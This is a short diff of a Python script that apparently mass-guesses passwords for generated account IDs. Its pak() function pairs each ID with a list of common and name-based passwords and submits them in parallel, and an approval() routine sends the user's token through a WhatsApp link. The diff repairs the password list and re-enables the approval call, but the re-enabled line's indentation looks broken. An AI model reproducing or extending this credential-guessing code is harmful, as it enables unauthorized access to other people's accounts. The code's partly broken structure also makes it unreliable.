@@ -290,7 +290,7 @@ def approval():
       tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('xdg-open https://wa.me/message/213676980481'+tks)
       sys.exit()
       #time.sleep(1)
-      #approval()
+approval()
   except Exception as error:
     print(error)                        
 def menu():
@@ -411,7 +411,7 @@ def pak():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'123456','123123','12345678','123456789','112233','mohamed','mohamed123','mohamed12345','qwerty','zxcvbn','zxcvbnm','wxcvbn','11223344','12341234','1122334455]
+					passlist = [psx,ids,'123456','123123','12345678','123456789','112233','mohamed','mohamed123','mohamed12345','qwerty','zxcvbn','zxcvbnm','wxcvbn','11223344','12341234','1122334455']
 				if mthd in ['1','01']:
 					JALIIIL.submit(JALIIIL4,ids,passlist)
 					
